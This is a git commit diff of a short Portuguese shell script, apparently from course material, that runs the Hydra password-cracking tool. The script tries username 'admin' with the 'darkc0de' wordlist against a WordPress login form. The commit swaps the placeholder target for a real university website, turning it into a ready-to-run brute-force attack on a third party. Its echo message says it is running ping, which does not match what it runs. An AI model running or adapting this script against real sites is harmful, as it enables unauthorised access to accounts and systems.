eb28e9bea51b25967ef57d8067ed20c706d22fe3
Robson Vaamonde <robsonvaamonde@gmail.com>
2017-06-08 13:13:46 -0300

    Create 06-hydra.sh

--- 02_day/06-hydra.sh
+++ 02_day/06-hydra.sh
@@ -5,16 +5,21 @@
 # Facebook: facebook.com/BoraParaPratica
 # YouTube: youtube.com/BoraParaPratica
 # Data de criação: 31/10/2016
-# Data de atualização: 31/10/2016
-# Versão: 1.0
+# Data de atualização: 05/06/2017
+# Versão: 1.1
+
+#Comandos utilizados no #Escape_Room_TI_SENAC_Tatuapé_30_Anos
 
 #Variável do comando Hydra
-ALVO="www.SEU_ALVO.br"
+ALVO="www.uninove.br"
 USERNAME="admin"
 WORDLIST="darkc0de.lst"
 
-#Executando o comando Hydra com a opções: -vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -l=Usuário, -P=Wordlist de senhas, http-post-from=Envio de formulário para adicionar o usuário e senhas
+#Executando o comando Hydra com a opções: 
+#-vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -l=Usuário, -P=Wordlist de senhas, 
+#http-post-from=Envio de formulário para adicionar o usuário e senhas
 #Informações para o http-post-form foi levantada utilizando o comando Curl
+
 echo -e "Executando o comando PING no alvo: $ALVO"
 echo
   hydra -vV $ALVO -l $USERNAME -P $WORDLIST http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Bad Loggin"
